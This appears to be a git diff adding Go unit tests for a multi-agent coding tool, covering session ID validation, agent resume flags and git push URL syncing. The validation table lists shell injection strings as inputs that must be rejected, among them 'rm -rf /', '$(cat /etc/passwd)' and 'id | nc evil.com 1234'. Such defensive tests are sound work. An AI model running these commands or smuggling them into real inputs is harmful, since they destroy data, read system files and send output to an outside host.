@@ -5,6 +5,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/steveyegge/gastown/internal/git"
@@ -548,6 +549,455 @@ func TestManagerRenameValidatesNewName(t *testing.T) {
 	}
 	if worker != nil && worker.Name != "bob" {
 		t.Errorf("expected name 'bob', got %q", worker.Name)
+	}
+}
+
+func TestValidateSessionID(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		id      string
+		wantErr bool
+	}{
+		// Valid cases
+		{name: "empty string", id: "", wantErr: false},
+		{name: "last sentinel", id: "last", wantErr: false},
+		{name: "UUID format", id: "01234567-89ab-cdef-0123-456789abcdef", wantErr: false},
+		{name: "hex string", id: "a1b2c3d4e5f6", wantErr: false},
+		{name: "alphanumeric", id: "session123", wantErr: false},
+		{name: "with underscores", id: "my_session_id", wantErr: false},
+		{name: "with dots", id: "session.v2.3", wantErr: false},
+		{name: "mixed", id: "Claude-Session_01.abc", wantErr: false},
+
+		// Shell injection attempts — all must be rejected
+		{name: "semicolon injection", id: "; rm -rf /", wantErr: true},
+		{name: "backtick injection", id: "`whoami`", wantErr: true},
+		{name: "dollar expansion", id: "$(cat /etc/passwd)", wantErr: true},
+		{name: "pipe injection", id: "id | nc evil.com 1234", wantErr: true},
+		{name: "ampersand", id: "foo && rm -rf /", wantErr: true},
+		{name: "single quote", id: "'; drop table;--", wantErr: true},
+		{name: "double quote", id: `"id"`, wantErr: true},
+		{name: "newline", id: "foo\nbar", wantErr: true},
+		{name: "space", id: "foo bar", wantErr: true},
+		{name: "redirect", id: "foo>/tmp/pwned", wantErr: true},
+		{name: "hash comment", id: "foo#comment", wantErr: true},
+		{name: "tilde", id: "~/evil", wantErr: true},
+		{name: "slash", id: "path/traversal", wantErr: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateSessionID(tt.id)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateSessionID(%q) error = %v, wantErr = %v", tt.id, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestStartOptionsResumeValidation(t *testing.T) {
+	t.Parallel()
+
+	// Verify that Start() rejects invalid session IDs early.
+	// We can't test the full Start() flow without tmux, but we can test
+	// that the validation function correctly gates the session ID.
+	tests := []struct {
+		name    string
+		id      string
+		wantErr bool
+	}{
+		{name: "valid UUID", id: "abc-123-def", wantErr: false},
+		{name: "injection attempt", id: "; rm -rf /", wantErr: true},
+		{name: "backtick injection", id: "`evil`", wantErr: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateSessionID(tt.id)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateSessionID(%q) = %v, wantErr %v", tt.id, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestBuildResumeArgs(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name      string
+		agent     string
+		sessionID string
+		wantArgs  string
+		wantErr   string
+	}{
+		// Claude: has ContinueFlag, flag-style resume
+		{
+			name:      "claude last uses --continue",
+			agent:     "claude",
+			sessionID: "last",
+			wantArgs:  "--continue",
+		},
+		{
+			name:      "claude specific ID uses --resume with ID",
+			agent:     "claude",
+			sessionID: "abc-123-def",
+			wantArgs:  "--resume abc-123-def",
+		},
+		// Gemini: no ContinueFlag, flag-style resume
+		{
+			name:      "gemini last errors without ContinueFlag",
+			agent:     "gemini",
+			sessionID: "last",
+			wantErr:   "does not support --resume without a session ID",
+		},
+		{
+			name:      "gemini specific ID works",
+			agent:     "gemini",
+			sessionID: "sess-456",
+			wantArgs:  "--resume sess-456",
+		},
+		// Codex: subcommand-style resume
+		{
+			name:      "codex rejected as subcommand-style",
+			agent:     "codex",
+			sessionID: "last",
+			wantErr:   "subcommand-style agents",
+		},
+		{
+			name:      "codex specific ID also rejected",
+			agent:     "codex",
+			sessionID: "abc-123",
+			wantErr:   "subcommand-style agents",
+		},
+		// Cursor: no ContinueFlag, flag-style resume
+		{
+			name:      "cursor last errors without ContinueFlag",
+			agent:     "cursor",
+			sessionID: "last",
+			wantErr:   "does not support --resume without a session ID",
+		},
+		{
+			name:      "cursor specific ID works",
+			agent:     "cursor",
+			sessionID: "chat-789",
+			wantArgs:  "--resume chat-789",
+		},
+		// OpenCode: no resume support at all
+		{
+			name:      "opencode rejected no resume support",
+			agent:     "opencode",
+			sessionID: "last",
+			wantErr:   "does not support session resume",
+		},
+		// Unknown agent
+		{
+			name:      "unknown agent rejected",
+			agent:     "nonexistent",
+			sessionID: "abc",
+			wantErr:   "does not support session resume",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			got, err := buildResumeArgs(tt.agent, tt.sessionID)
+			if tt.wantErr != "" {
+				if err == nil {
+					t.Fatalf("expected error containing %q, got nil", tt.wantErr)
+				}
+				if got := err.Error(); !strings.Contains(got, tt.wantErr) {
+					t.Errorf("error %q does not contain %q", got, tt.wantErr)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			if got != tt.wantArgs {
+				t.Errorf("buildResumeArgs(%q, %q) = %q, want %q", tt.agent, tt.sessionID, got, tt.wantArgs)
+			}
+		})
+	}
+}
+
+func TestManagerAddSyncsCustomPushURLFromRig(t *testing.T) {
+	tmpDir, err := os.MkdirTemp("", "crew-test-push-url-*")
+	if err != nil {
+		t.Fatalf("failed to create temp dir: %v", err)
+	}
+	defer func() { _ = os.RemoveAll(tmpDir) }()
+
+	rigPath := filepath.Join(tmpDir, "test-rig")
+	if err := os.MkdirAll(rigPath, 0755); err != nil {
+		t.Fatalf("failed to create rig dir: %v", err)
+	}
+
+	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
+	forkRepoPath := filepath.Join(tmpDir, "fork.git")
+	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
+		t.Fatalf("failed to create upstream bare repo: %v", err)
+	}
+	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
+		t.Fatalf("failed to create fork bare repo: %v", err)
+	}
+
+	// Create mayor clone with fetch=upstream and push=fork.
+	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
+	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
+		t.Fatalf("failed to create mayor dir: %v", err)
+	}
+	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
+		t.Fatalf("failed to clone mayor rig: %v", err)
+	}
+	if err := runCmd("git", "-C", mayorRigPath, "remote", "set-url", "origin", "--push", forkRepoPath); err != nil {
+		t.Fatalf("failed to set mayor push url: %v", err)
+	}
+
+	r := &rig.Rig{
+		Name:    "test-rig",
+		Path:    rigPath,
+		GitURL:  upstreamRepoPath,
+		PushURL: forkRepoPath, // config.json is the source of truth for origin push URL
+	}
+	mgr := NewManager(r, git.NewGit(rigPath))
+
+	worker, err := mgr.Add("dave", false)
+	if err != nil {
+		t.Fatalf("Add failed: %v", err)
+	}
+
+	crewRepo := worker.ClonePath
+	outFetch, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew fetch URL: %v (%s)", err, outFetch)
+	}
+	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
+	}
+
+	fetchURL := strings.TrimSpace(string(outFetch))
+	pushURL := strings.TrimSpace(string(outPush))
+
+	if fetchURL != upstreamRepoPath {
+		t.Errorf("crew fetch URL = %q, want %q", fetchURL, upstreamRepoPath)
+	}
+	if pushURL != forkRepoPath {
+		t.Errorf("crew push URL = %q, want %q", pushURL, forkRepoPath)
+	}
+}
+
+func TestManagerAddSyncsFallbackPushURLFromConfig(t *testing.T) {
+	// When mayor has NO custom push URL but Rig.PushURL is set (from config.json),
+	// the crew clone should receive the push URL via the config fallback path.
+	tmpDir, err := os.MkdirTemp("", "crew-test-push-fallback-*")
+	if err != nil {
+		t.Fatalf("failed to create temp dir: %v", err)
+	}
+	defer func() { _ = os.RemoveAll(tmpDir) }()
+
+	rigPath := filepath.Join(tmpDir, "test-rig")
+	if err := os.MkdirAll(rigPath, 0755); err != nil {
+		t.Fatalf("failed to create rig dir: %v", err)
+	}
+
+	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
+	forkRepoPath := filepath.Join(tmpDir, "fork.git")
+	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
+		t.Fatalf("failed to create upstream bare repo: %v", err)
+	}
+	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
+		t.Fatalf("failed to create fork bare repo: %v", err)
+	}
+
+	// Create mayor clone pointing to upstream — NO custom push URL on mayor.
+	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
+	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
+		t.Fatalf("failed to create mayor dir: %v", err)
+	}
+	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
+		t.Fatalf("failed to clone mayor rig: %v", err)
+	}
+	// Intentionally NOT setting push URL on mayor — this tests the fallback path.
+
+	// Rig has PushURL set (as if loaded from config.json)
+	r := &rig.Rig{
+		Name:    "test-rig",
+		Path:    rigPath,
+		GitURL:  upstreamRepoPath,
+		PushURL: forkRepoPath,
+	}
+	mgr := NewManager(r, git.NewGit(rigPath))
+
+	worker, err := mgr.Add("eve", false)
+	if err != nil {
+		t.Fatalf("Add failed: %v", err)
+	}
+
+	crewRepo := worker.ClonePath
+	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
+	}
+
+	pushURL := strings.TrimSpace(string(outPush))
+	if pushURL != forkRepoPath {
+		t.Errorf("crew push URL = %q, want %q (expected config.json fallback)", pushURL, forkRepoPath)
+	}
+}
+
+func TestManagerAddNoPushURLWhenConfigEmpty(t *testing.T) {
+	// When Rig.PushURL is empty and mayor has no custom push URL,
+	// crew clone should NOT have a custom push URL (push URL == fetch URL).
+	tmpDir, err := os.MkdirTemp("", "crew-test-no-push-*")
+	if err != nil {
+		t.Fatalf("failed to create temp dir: %v", err)
+	}
+	defer func() { _ = os.RemoveAll(tmpDir) }()
+
+	rigPath := filepath.Join(tmpDir, "test-rig")
+	if err := os.MkdirAll(rigPath, 0755); err != nil {
+		t.Fatalf("failed to create rig dir: %v", err)
+	}
+
+	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
+	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
+		t.Fatalf("failed to create upstream bare repo: %v", err)
+	}
+
+	// Create mayor clone with NO custom push URL.
+	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
+	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
+		t.Fatalf("failed to create mayor dir: %v", err)
+	}
+	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
+		t.Fatalf("failed to clone mayor rig: %v", err)
+	}
+
+	r := &rig.Rig{
+		Name:   "test-rig",
+		Path:   rigPath,
+		GitURL: upstreamRepoPath,
+		// PushURL intentionally empty
+	}
+	mgr := NewManager(r, git.NewGit(rigPath))
+
+	worker, err := mgr.Add("alice", false)
+	if err != nil {
+		t.Fatalf("Add failed: %v", err)
+	}
+
+	crewRepo := worker.ClonePath
+	outFetch, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew fetch URL: %v (%s)", err, outFetch)
+	}
+	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
+	}
+
+	fetchURL := strings.TrimSpace(string(outFetch))
+	pushURL := strings.TrimSpace(string(outPush))
+
+	// Push URL should equal fetch URL (no custom push URL configured)
+	if pushURL != fetchURL {
+		t.Errorf("crew push URL = %q, want %q (should match fetch URL when no push_url configured)", pushURL, fetchURL)
+	}
+}
+
+func TestManagerAddClearsStalePushURLOnSync(t *testing.T) {
+	// When Rig.PushURL is empty but a crew clone already has a custom push URL,
+	// sync should clear the stale push URL so push matches fetch.
+	tmpDir, err := os.MkdirTemp("", "crew-test-clear-push-*")
+	if err != nil {
+		t.Fatalf("failed to create temp dir: %v", err)
+	}
+	defer func() { _ = os.RemoveAll(tmpDir) }()
+
+	rigPath := filepath.Join(tmpDir, "test-rig")
+	if err := os.MkdirAll(rigPath, 0755); err != nil {
+		t.Fatalf("failed to create rig dir: %v", err)
+	}
+
+	upstreamRepoPath := filepath.Join(tmpDir, "upstream.git")
+	forkRepoPath := filepath.Join(tmpDir, "fork.git")
+	if err := runCmd("git", "init", "--bare", upstreamRepoPath); err != nil {
+		t.Fatalf("failed to create upstream bare repo: %v", err)
+	}
+	if err := runCmd("git", "init", "--bare", forkRepoPath); err != nil {
+		t.Fatalf("failed to create fork bare repo: %v", err)
+	}
+
+	// Create mayor clone (no custom push URL on mayor)
+	mayorRigPath := filepath.Join(rigPath, "mayor", "rig")
+	if err := os.MkdirAll(filepath.Dir(mayorRigPath), 0755); err != nil {
+		t.Fatalf("failed to create mayor dir: %v", err)
+	}
+	if err := runCmd("git", "clone", upstreamRepoPath, mayorRigPath); err != nil {
+		t.Fatalf("failed to clone mayor rig: %v", err)
+	}
+
+	// Step 1: Create crew with a push URL configured (simulating previous config)
+	r := &rig.Rig{
+		Name:    "test-rig",
+		Path:    rigPath,
+		GitURL:  upstreamRepoPath,
+		PushURL: forkRepoPath, // Initially configured
+	}
+	mgr := NewManager(r, git.NewGit(rigPath))
+
+	worker, err := mgr.Add("staletest", false)
+	if err != nil {
+		t.Fatalf("Add failed: %v", err)
+	}
+
+	// Verify push URL was set
+	crewRepo := worker.ClonePath
+	outPush, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush)
+	}
+	pushURL := strings.TrimSpace(string(outPush))
+	if pushURL != forkRepoPath {
+		t.Fatalf("expected push URL %q, got %q", forkRepoPath, pushURL)
+	}
+
+	// Step 2: Create a new manager with empty PushURL (simulating push_url removal from config)
+	// and call syncRemotesFromRig on the SAME crew clone to exercise in-place clearing.
+	r2 := &rig.Rig{
+		Name:   "test-rig",
+		Path:   rigPath,
+		GitURL: upstreamRepoPath,
+		// PushURL intentionally empty — simulates config change
+	}
+	mgr2 := NewManager(r2, git.NewGit(rigPath))
+
+	// Sync the existing crew clone in-place (not a new clone)
+	if err := mgr2.syncRemotesFromRig(crewRepo); err != nil {
+		t.Fatalf("syncRemotesFromRig failed: %v", err)
+	}
+
+	// Verify push URL was cleared on the same crew clone
+	outFetch2, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew fetch URL: %v (%s)", err, outFetch2)
+	}
+	outPush2, err := exec.Command("git", "-C", crewRepo, "remote", "get-url", "--push", "origin").CombinedOutput()
+	if err != nil {
+		t.Fatalf("failed to read crew push URL: %v (%s)", err, outPush2)
+	}
+
+	fetchURL2 := strings.TrimSpace(string(outFetch2))
+	pushURL2 := strings.TrimSpace(string(outPush2))
+
+	if pushURL2 != fetchURL2 {
+		t.Errorf("crew push URL = %q, want %q (should match fetch URL after in-place stale clearing)", pushURL2, fetchURL2)
 	}
 }
 
